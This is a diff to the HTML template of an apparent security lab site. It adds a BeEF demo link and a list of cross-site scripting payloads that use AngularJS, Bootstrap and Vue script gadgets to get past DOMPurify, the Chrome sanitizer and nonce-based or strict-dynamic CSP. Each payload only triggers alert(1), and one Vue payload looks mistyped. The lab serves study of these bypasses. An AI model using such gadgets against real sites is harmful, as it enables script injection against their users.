@@ -19,21 +19,23 @@
         background-color: #dddddd;
         }
     </style>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/vs.min.css')}}" />
+    <script src="{{ url_for('static', filename='tools/html-code-block-element.common.min.js')}}" defer></script>
 </head>
 <body>
-    <p> This holds the attacks
+    <p> <strong>This is the home page for all victim codes and exploits</strong>
 
     <table>
         <tr>
           <th>Content Security Policy</th>
-          <th>Filters</th>
+          <!-- <th>Filters</th> -->
           <th>Sanitizers</th>
         </tr>
         <tr>
           <td><a href="{{ url_for('csp.csp', name='angularjs-ui1.html') }}">AngularJS with unsafe-inline enable 1</a>
             <br><a href="{{ url_for('csp.csp', name='angularjs-ui2.html') }}">AngularJS with unsafe-inline enable 2</a>
           </td>
-          <td><a href="{{ url_for('filters.filter', name='bootstrap.html') }}">Bootstrp edge</a></td>
+          <!-- <td><a href="{{ url_for('filters.filter', name='bootstrap.html') }}">Bootstrp edge</a></td> -->
           <td><a href="{{ url_for('sanitizers.san', name='angularjs-dompurify.html') }}">AngularJS & Dompurify</a>
             <br><a href="{{ url_for('sanitizers.san', name='angularjs-google.html') }}">AngularJS & Google</a>
           </td>
@@ -43,23 +45,84 @@
             <br><a href="{{ url_for('csp.csp_attack', name='angularjs-ue2.html') }}">AngularJS with unsafe-eval enable 2</a>
             <br><a href="{{ url_for('csp.csp_attack', name='angularjs-dis-ue-ui.html') }}">AngularJS with unsafe-eval and unsafe-inline disabled</a>
             </td>
-          <td></td>
+          <!-- <td></td> -->
           <td><a href="{{ url_for('sanitizers.san', name='bootstrap-dompurify.html') }}">Bootsrap & Dompurify</a></td>
         </tr>
         <tr>
           <td><a href="{{ url_for('csp.csp_nonce', name='angularjs-nonce.html') }}">AngularJS with nonce enable</a>
             <br><a href="{{ url_for('csp.csp_nonce', name='angularjs-nonce-sd.html') }}">AngularJS with nonce and strict-dynamic enable</a>
             </td>
-          <td></td>
+          <!-- <td></td> -->
           <td></td>
         </tr>
         <tr>
           <td><a href="{{ url_for('csp.csp_nonce', name='bootstrap.html') }}">Bootstrap with strict dynamic enable</a>
             <br><a href="{{ url_for('csp.csp_nonce', name='vue.html') }}">Vue with nonce and strict-dynamic enable</a>
             </td>
-          <td></td>
+          <!-- <td></td> -->
           <td></td>
         </tr>
       </table>
+<P><a href="{{ url_for('csp.csp', name='beefdemo.html') }}">Demo attack using Beef framework.</a></P>
+<p><strong>The following list the attack payload for each category:</strong></p>
+<p>Attack code for exploiting AngularJS with DOMpurify and Chrome sanitizer.</p>
+<code-block language="js" label="angularjs-sanitizer" controls>
+<textarea>
+{% raw %}<div ng-app>
+  {{''.constructor.constructor('alert(1)')()}}
+</div>{% endraw %}</textarea>
+</code-block>
+
+      <p>Attack code for exploiting Bootstrap with DOMpurify sanitizer.</p>
+      <code-block language="js" label="bootstrap-sanitizer" controls>
+<textarea>{% raw %}<div data-toggle=tooltip data-html=true title='<script>alert(1)</script>'>Successs, hover to alert</div>{% endraw %}</textarea>
+      </code-block>
+      
+      <p>Attack code for exploiting AngularJS with whitelist-based CSP but Enable unsafe-inline.</p>
+      <code-block language="js" label="angularjs-csp-unsafe-inline" controls>
+<textarea>{% raw %}<script>alert(1);</script>{% endraw %}
+</textarea></code-block>
+      
+      <p>Attack code for exploiting AngularJS with whitelist-based CSP but Enable unsafe-eval.</p>
+      <code-block language="js" label="angularjs-csp-unsafe-eval" controls>
+<textarea>{% raw %}<div ng-app>
+  {{''.constructor.constructor('alert(1)')()}}
+</div>{% endraw %}</textarea></code-block>
+      
+      <p>Attack code for exploiting AngularJS with whitelist-based CSP but disable unsafe-eval and unsafe-inline.</p>
+      <code-block language="js" label="angularjs-csp-disable" controls>
+<textarea>{% raw %}
+// Works only in Chrome
+<div ng-app>
+	<div>Click the Input Box</div>
+    <input id='example' ng-click=$event.path|orderBy:'alert(1)'>
+</div>
+{% endraw %}</textarea></code-block>
+
+<p>Attack code for exploiting AngularJS with nonce-based CSP, with and without strict-dynamic enabled.</p>
+<code-block language="js" label="angularjs-nonce" controls>
+<textarea>{% raw %}
+// Works both in Chrome and firefox
+<div ng-app>
+<div>Click the Input Box</div>
+<input id='example' ng-click=$event.path|orderBy:'alert(1)'>
+</div>
+{% endraw %}</textarea></code-block>
+
+<p>Attack code for exploiting Bootstrap with nonce-based CSP, with strict-dynamic enabled.</p>
+<code-block language="js" label="bootstrap-nonce" controls>
+<textarea>{% raw %}
+<div data-toggle=tooltip data-html=true title='<script>alert(1)<\/script>'>Success (hover to trigger alert)</div>
+{% endraw %}</textarea></code-block>
+
+<p>Attack code for exploiting VueJS with nonce-based CSP, with strict-dynamic enabled.</p>
+<code-block language="js" label="vue-nonce" controls>
+<textarea>{% raw %}
+// Attack 1
+<div id=app-4><script type=application/ecmascript>alert(1)</script></div>
+
+// Attack 2
+<div id=app-4><div v-html="''.constructor.constructor>('alert(1)')()"></div></div>
+{% endraw %}</textarea></code-block>
 </body>
 </html>
